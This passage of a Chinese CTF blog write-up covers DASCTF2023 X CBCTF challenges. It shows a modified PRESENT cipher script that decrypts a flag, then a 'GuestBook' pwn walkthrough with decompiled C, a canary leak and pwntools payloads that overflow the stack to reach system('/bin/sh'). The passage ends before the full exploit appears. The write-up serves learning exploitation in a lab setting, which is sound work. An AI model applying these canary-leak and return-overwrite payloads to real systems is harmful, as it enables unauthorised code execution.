THE SOFTWARE OR THE USE OR OTHER DEALINGS IN</span></span><br><span class="line"><span class="comment"># THE SOFTWARE.</span></span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot; PRESENT block cipher implementation</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">USAGE EXAMPLE:</span></span><br><span class="line"><span class="string">---------------</span></span><br><span class="line"><span class="string">Importing:</span></span><br><span class="line"><span class="string">-----------</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>from pypresent import Present</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Encrypting with a 80-bit key:</span></span><br><span class="line"><span class="string">------------------------------</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>key = &quot;00000000000000000000&quot;.decode(&#x27;hex&#x27;)</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>plain = &quot;0000000000000000&quot;.decode(&#x27;hex&#x27;)</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>cipher = Present(key)</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>encrypted = cipher.encrypt(plain)</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>encrypted.encode(&#x27;hex&#x27;)</span></span><br><span class="line"><span class="string">&#x27;5579c1387b228445&#x27;</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>decrypted = cipher.decrypt(encrypted)</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>decrypted.encode(&#x27;hex&#x27;)</span></span><br><span class="line"><span class="string">&#x27;0000000000000000&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Encrypting with a 128-bit key:</span></span><br><span class="line"><span class="string">-------------------------------</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>key = &quot;0123456789abcdef0123456789abcdef&quot;.decode(&#x27;hex&#x27;)</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>plain = &quot;0123456789abcdef&quot;.decode(&#x27;hex&#x27;)</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>cipher = Present(key)</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>encrypted = cipher.encrypt(plain)</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>encrypted.encode(&#x27;hex&#x27;)</span></span><br><span class="line"><span class="string">&#x27;0e9d28685e671dd6&#x27;</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>decrypted = cipher.decrypt(encrypted)</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>decrypted.encode(&#x27;hex&#x27;)</span></span><br><span class="line"><span class="string">&#x27;0123456789abcdef&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fully based on standard specifications: http://www.crypto.ruhr-uni-bochum.de/imperia/md/content/texte/publications/conferences/present_ches2007.pdf</span></span><br><span class="line"><span class="string">test vectors: http://www.crypto.ruhr-uni-bochum.de/imperia/md/content/texte/publications/conferences/slides/present_testvectors.zip</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Present</span>:</span></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,key,rounds=<span class="number">32</span></span>):</span></span><br><span class="line">                <span class="string">&quot;&quot;&quot;Create a PRESENT cipher object</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                key:    the key as a 128-bit or 80-bit rawstring</span></span><br><span class="line"><span class="string">                rounds: the number of rounds as an integer, 32 by default</span></span><br><span class="line"><span class="string">                &quot;&quot;&quot;</span></span><br><span class="line">                self.rounds = rounds</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(key) * <span class="number">8</span> == <span class="number">80</span>:</span><br><span class="line">                        self.roundkeys = generateRoundkeys80(string2number(key),self.rounds)</span><br><span class="line">                <span class="keyword">elif</span> <span class="built_in">len</span>(key) * <span class="number">8</span> == <span class="number">128</span>:</span><br><span class="line">                        self.roundkeys = generateRoundkeys128(string2number(key),self.rounds)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Key must be a 128-bit or 80-bit rawstring&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">self,block</span>):</span></span><br><span class="line">                <span class="string">&quot;&quot;&quot;Encrypt 1 block (8 bytes)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                Input:  plaintext block as raw string</span></span><br><span class="line"><span class="string">                Output: ciphertext block as raw string</span></span><br><span class="line"><span class="string">                &quot;&quot;&quot;</span></span><br><span class="line">                state = string2number(block)</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (self.rounds-<span class="number">1</span>):</span><br><span class="line">                        state = addRoundKey(state,self.roundkeys[i])</span><br><span class="line">                        state = sBoxLayer(state)</span><br><span class="line">                        state = pLayer(state)</span><br><span class="line">                cipher = addRoundKey(state,self.roundkeys[-<span class="number">1</span>])</span><br><span class="line">                <span class="keyword">return</span> number2string_N(cipher,<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">self,block</span>):</span></span><br><span class="line">                <span class="string">&quot;&quot;&quot;Decrypt 1 block (8 bytes)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                Input:  ciphertext block as raw string</span></span><br><span class="line"><span class="string">                Output: plaintext block as raw string</span></span><br><span class="line"><span class="string">                &quot;&quot;&quot;</span></span><br><span class="line">                state = string2number(block)</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (self.rounds-<span class="number">1</span>):</span><br><span class="line">                        state = addRoundKey(state,self.roundkeys[-i-<span class="number">1</span>])</span><br><span class="line">                        state = pLayer_dec(state)</span><br><span class="line">                        state = sBoxLayer_dec(state)</span><br><span class="line">                decipher = addRoundKey(state,self.roundkeys[<span class="number">0</span>])</span><br><span class="line">                <span class="keyword">return</span> number2string_N(decipher,<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">get_block_size</span>(<span class="params">self</span>):</span></span><br><span class="line">                <span class="keyword">return</span> <span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#        0   1   2   3   4   5   6   7   8   9   a   b   c   d   e   f</span></span><br><span class="line">Sbox= [<span class="number">0xc</span>,<span class="number">0x5</span>,<span class="number">0x6</span>,<span class="number">0xb</span>,<span class="number">0x9</span>,<span class="number">0x0</span>,<span class="number">0xa</span>,<span class="number">0xd</span>,<span class="number">0x3</span>,<span class="number">0xe</span>,<span class="number">0xf</span>,<span class="number">0x8</span>,<span class="number">0x4</span>,<span class="number">0x7</span>,<span class="number">0x1</span>,<span class="number">0x2</span>]</span><br><span class="line">Sbox_inv = [Sbox.index(x) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)]</span><br><span class="line">PBox = [<span class="number">0</span>,<span class="number">16</span>,<span class="number">32</span>,<span class="number">48</span>,<span class="number">1</span>,<span class="number">17</span>,<span class="number">33</span>,<span class="number">49</span>,<span class="number">2</span>,<span class="number">18</span>,<span class="number">34</span>,<span class="number">50</span>,<span class="number">3</span>,<span class="number">19</span>,<span class="number">35</span>,<span class="number">51</span>,</span><br><span class="line">        <span class="number">4</span>,<span class="number">20</span>,<span class="number">36</span>,<span class="number">52</span>,<span class="number">5</span>,<span class="number">21</span>,<span class="number">37</span>,<span class="number">53</span>,<span class="number">6</span>,<span class="number">22</span>,<span class="number">38</span>,<span class="number">54</span>,<span class="number">7</span>,<span class="number">23</span>,<span class="number">39</span>,<span class="number">55</span>,</span><br><span class="line">        <span class="number">8</span>,<span class="number">24</span>,<span class="number">40</span>,<span class="number">56</span>,<span class="number">9</span>,<span class="number">25</span>,<span class="number">41</span>,<span class="number">57</span>,<span class="number">10</span>,<span class="number">26</span>,<span class="number">42</span>,<span class="number">58</span>,<span class="number">11</span>,<span class="number">27</span>,<span class="number">43</span>,<span class="number">59</span>,</span><br><span class="line">        <span class="number">12</span>,<span class="number">28</span>,<span class="number">44</span>,<span class="number">60</span>,<span class="number">13</span>,<span class="number">29</span>,<span class="number">45</span>,<span class="number">61</span>,<span class="number">14</span>,<span class="number">30</span>,<span class="number">46</span>,<span class="number">62</span>,<span class="number">15</span>,<span class="number">31</span>,<span class="number">47</span>,<span class="number">63</span>]</span><br><span class="line">PBox_inv = [PBox.index(x) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>)]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generateRoundkeys80</span>(<span class="params">key,rounds</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;Generate the roundkeys for a 80-bit key</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Input:</span></span><br><span class="line"><span class="string">                key:    the key as a 80-bit integer</span></span><br><span class="line"><span class="string">                rounds: the number of rounds as an integer</span></span><br><span class="line"><span class="string">        Output: list of 64-bit roundkeys as integers&quot;&quot;&quot;</span></span><br><span class="line">        roundkeys = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,rounds+<span class="number">1</span>): <span class="comment"># (K1 ... K32)</span></span><br><span class="line">                <span class="comment"># rawkey: used in comments to show what happens at bitlevel</span></span><br><span class="line">                <span class="comment"># rawKey[0:64]</span></span><br><span class="line">                roundkeys.append(key &gt;&gt;<span class="number">16</span>)</span><br><span class="line">                <span class="comment">#1. Shift</span></span><br><span class="line">                <span class="comment">#rawKey[19:len(rawKey)]+rawKey[0:19]</span></span><br><span class="line">                key = ((key &amp; (<span class="number">2</span>**<span class="number">19</span>-<span class="number">1</span>)) &lt;&lt; <span class="number">61</span>) + (key &gt;&gt; <span class="number">19</span>)</span><br><span class="line">                <span class="comment">#2. SBox</span></span><br><span class="line">                <span class="comment">#rawKey[76:80] = S(rawKey[76:80])</span></span><br><span class="line">                key = (Sbox[key &gt;&gt; <span class="number">76</span>] &lt;&lt; <span class="number">76</span>)+(key &amp; (<span class="number">2</span>**<span class="number">76</span>-<span class="number">1</span>))</span><br><span class="line">                <span class="comment">#3. Salt</span></span><br><span class="line">                <span class="comment">#rawKey[15:20] ^ i</span></span><br><span class="line">                key ^= (i &lt;&lt; <span class="number">15</span>) ^ (key &gt;&gt; <span class="number">19</span>)  <span class="comment"># 这里的 ^ (key &gt;&gt; 19) 是 DAS的题魔改的，原型没有</span></span><br><span class="line">        <span class="keyword">return</span> roundkeys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generateRoundkeys128</span>(<span class="params">key,rounds</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;Generate the roundkeys for a 128-bit key</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Input:</span></span><br><span class="line"><span class="string">                key:    the key as a 128-bit integer</span></span><br><span class="line"><span class="string">                rounds: the number of rounds as an integer</span></span><br><span class="line"><span class="string">        Output: list of 64-bit roundkeys as integers&quot;&quot;&quot;</span></span><br><span class="line">        roundkeys = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,rounds+<span class="number">1</span>): <span class="comment"># (K1 ... K32)</span></span><br><span class="line">                <span class="comment"># rawkey: used in comments to show what happens at bitlevel</span></span><br><span class="line">                roundkeys.append(key &gt;&gt;<span class="number">64</span>)</span><br><span class="line">                <span class="comment">#1. Shift</span></span><br><span class="line">                key = ((key &amp; (<span class="number">2</span>**<span class="number">67</span>-<span class="number">1</span>)) &lt;&lt; <span class="number">61</span>) + (key &gt;&gt; <span class="number">67</span>)</span><br><span class="line">                <span class="comment">#2. SBox</span></span><br><span class="line">                key = (Sbox[key &gt;&gt; <span class="number">124</span>] &lt;&lt; <span class="number">124</span>)+(Sbox[(key &gt;&gt; <span class="number">120</span>) &amp; <span class="number">0xF</span>] &lt;&lt; <span class="number">120</span>)+(key &amp; (<span class="number">2</span>**<span class="number">120</span>-<span class="number">1</span>))</span><br><span class="line">                <span class="comment">#3. Salt</span></span><br><span class="line">                <span class="comment">#rawKey[62:67] ^ i</span></span><br><span class="line">                key ^= i &lt;&lt; <span class="number">62</span></span><br><span class="line">        <span class="keyword">return</span> roundkeys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addRoundKey</span>(<span class="params">state,roundkey</span>):</span></span><br><span class="line">        <span class="keyword">return</span> state ^ roundkey</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sBoxLayer</span>(<span class="params">state</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;SBox function for encryption</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Input:  64-bit integer</span></span><br><span class="line"><span class="string">        Output: 64-bit integer&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        output = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">                output += Sbox[( state &gt;&gt; (i*<span class="number">4</span>)) &amp; <span class="number">0xF</span>] &lt;&lt; (i*<span class="number">4</span>)</span><br><span class="line">        <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sBoxLayer_dec</span>(<span class="params">state</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;Inverse SBox function for decryption</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Input:  64-bit integer</span></span><br><span class="line"><span class="string">        Output: 64-bit integer&quot;&quot;&quot;</span></span><br><span class="line">        output = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">                output += Sbox_inv[( state &gt;&gt; (i*<span class="number">4</span>)) &amp; <span class="number">0xF</span>] &lt;&lt; (i*<span class="number">4</span>)</span><br><span class="line">        <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pLayer</span>(<span class="params">state</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;Permutation layer for encryption</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Input:  64-bit integer</span></span><br><span class="line"><span class="string">        Output: 64-bit integer&quot;&quot;&quot;</span></span><br><span class="line">        output = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">                output += ((state &gt;&gt; i) &amp; <span class="number">0x01</span>) &lt;&lt; PBox[i]</span><br><span class="line">        <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pLayer_dec</span>(<span class="params">state</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;Permutation layer for decryption</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Input:  64-bit integer</span></span><br><span class="line"><span class="string">        Output: 64-bit integer&quot;&quot;&quot;</span></span><br><span class="line">        output = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">                output += ((state &gt;&gt; i) &amp; <span class="number">0x01</span>) &lt;&lt; PBox_inv[i]</span><br><span class="line">        <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">string2number</span>(<span class="params">i</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot; Convert a string to a number</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Input: string (big-endian)</span></span><br><span class="line"><span class="string">    Output: long or integer</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">   </span><br><span class="line">    val = <span class="built_in">int</span>.from_bytes(i, byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">    <span class="comment"># print(hex(val))</span></span><br><span class="line">    <span class="keyword">return</span> val</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">number2string_N</span>(<span class="params">i, N</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Convert a number to a string of fixed size</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    i: long or integer</span></span><br><span class="line"><span class="string">    N: length of string</span></span><br><span class="line"><span class="string">    Output: string (big-endian)</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    s = <span class="string">&#x27;%0*x&#x27;</span> % (N*<span class="number">2</span>, i)</span><br><span class="line">    <span class="keyword">return</span> binascii.unhexlify(<span class="built_in">str</span>(s))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_test</span>():</span></span><br><span class="line">    <span class="keyword">import</span> doctest</span><br><span class="line">    doctest.testmod()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    _test()</span><br></pre></td></tr></table></figure>

<p>输入比较鸡肋，必须得是这种格式（懒得改上述脚本）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pypresent <span class="keyword">import</span> Present</span><br><span class="line"></span><br><span class="line">cmps = [<span class="number">120617461261311902</span>, <span class="number">16357837616839286114</span>, <span class="number">312508749794633008</span>, <span class="number">1843701600916795272</span>]</span><br><span class="line"><span class="comment">#cipher = Present(bytes.fromhex(&#x27;12131415161718192021&#x27;))</span></span><br><span class="line"></span><br><span class="line">key = <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;12131415161718192021&#x27;</span>)</span><br><span class="line">enc = <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;01ac84f124309f9e&#x27;</span>)</span><br><span class="line">cipher = Present(key)</span><br><span class="line">flag = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cmps)):</span><br><span class="line">    <span class="built_in">round</span> = <span class="built_in">hex</span>(cmps[i])[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">len</span>(<span class="built_in">round</span>) % <span class="number">2</span>):</span><br><span class="line">        <span class="built_in">round</span> = <span class="string">&#x27;0&#x27;</span> + <span class="built_in">round</span></span><br><span class="line">    flag += (cipher.decrypt(<span class="built_in">bytes</span>.fromhex(<span class="built_in">round</span>)))[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>Get Flag</p>
<p><img src="/DASCTF2023-X-CBCTF/image-20231024143201548.png" alt="image-20231024143201548"></p>
<h2 id="GuestBook"><a href="#GuestBook" class="headerlink" title="GuestBook"></a>GuestBook</h2><h3 id="0x00-Daily-Shell-Check-2"><a href="#0x00-Daily-Shell-Check-2" class="headerlink" title="0x00 Daily Shell Check"></a>0x00 Daily Shell Check</h3><p>无壳64位</p>
<p><img src="/DASCTF2023-X-CBCTF/image-20231024143746407.png" alt="image-20231024143746407"></p>
<p>好像PWN应该这样查壳才对，开了个Canary</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Ξ ~ git:(master) ▶ checksec GuestBook </span><br><span class="line">[*] &#x27;/home/pz/GuestBook&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>



<h3 id="0x01-Find-Hole"><a href="#0x01-Find-Hole" class="headerlink" title="0x01 Find Hole"></a>0x01 Find Hole</h3><p>审计可发现，泄露canary和栈溢出都有，同时题目也有 system(‘/bin/sh’) 函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v1[<span class="number">128</span>]; <span class="comment">// [rsp+0h] [rbp-A0h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">24</span>]; <span class="comment">// [rsp+80h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+98h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;  ____                 _   ____              _&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; / ___|_   _  ___  ___| |_| __ )  ___   ___ | | __&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;| |  _| | | |/ _ \\/ __| __|  _ \\ / _ \\ / _ \\| |/ /&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;| |_| | |_| |  __/\\__ \\ |_| |_) | (_) | (_) |   &lt;&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; \\____|\\__,_|\\___||___/\\__|____/ \\___/ \\___/|_|\\_\\&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_40211B);</span><br><span class="line">  message = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x1000</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !message )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Malloc error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input your name: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">32uLL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello %s!&quot;</span>, buf);                     <span class="comment">// 泄露Canary</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;How many messages would you like to leave(MAX 4): &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;num);</span><br><span class="line">  <span class="keyword">if</span> ( num &gt; <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Too much!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; num; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, message);</span><br><span class="line">    <span class="built_in">strcpy</span>(&amp;v1[<span class="number">32</span> * i], message);               <span class="comment">// v1存储溢出</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Bye!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;             <span class="comment">// 要过canary</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Canary"><a href="#Canary" class="headerlink" title="Canary"></a>Canary</h4><p>对应的漏洞点是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">char buf[24]; // [rsp+80h] [rbp-20h] BYREF</span><br><span class="line">read(0, buf, 32uLL);</span><br><span class="line">printf(&quot;Hello %s!&quot;, buf);                     // 泄露Canary</span><br></pre></td></tr></table></figure>

<p>回忆下有canary栈的结构，可以得知只要我们输入24个字符再加上一个字符覆盖掉canary最后的00即可泄露canary</p>
<p>对应payload</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sdla(<span class="string">&quot;name: &quot;</span>, <span class="string">b&#x27;Z&#x27;</span> * <span class="number">24</span>) <span class="comment"># 注意还有个 \n 因为是sendlineafter</span></span><br><span class="line">rc(<span class="number">30</span>)</span><br><span class="line">canary = u64(rc(<span class="number">8</span>)) - <span class="number">0xA</span> </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br></pre></td></tr></table></figure>

<p>成功泄露</p>
<p><img src="/DASCTF2023-X-CBCTF/image-20231024145321158.png" alt="image-20231024145321158"></p>
<h4 id="StackOverflow"><a href="#StackOverflow" class="headerlink" title="StackOverflow"></a>StackOverflow</h4><p>随后程序给了四次栈溢出写入的机会（本来还在找这个num是不是整数溢出，然而这种没有强制转换成int就不要找了）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;num);</span><br><span class="line"><span class="keyword">if</span> ( num &gt; <span class="number">4</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Too much!&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; num; ++i )</span><br><span class="line">&#123;</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, message);</span><br><span class="line">  <span class="built_in">strcpy</span>(&amp;v1[<span class="number">32</span> * i], message);               <span class="comment">// v1存储溢出</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那我们要的数据就是返回地址和canary由于要注意canary结尾是00，所以要分两次写入，第一次写入返回地址和没有00的canary，第二次把00补上</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;Z&#x27;</span> * (<span class="number">128</span> + <span class="number">24</span>) + p64(canary + <span class="number">0x1</span>) + <span class="string">b&#x27;Z&#x27;</span> * <span class="number">8</span> + p64(system)</span><br><span class="line">sdl(payload)</span><br><span class="line">payload = <span class="string">b&#x27;Z&#x27;</span> * (<span class="number">96</span> + <span class="number">24</span>) + <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">sdl(payload)</span><br></pre></td></tr></table></figure>



<h3 id="0x02-Get-Flag-2"><a href="#0x02-Get-Flag-2" class="headerlink" title="0x02 Get Flag"></a>0x02 Get Flag</h3><p>完整EXP</p>
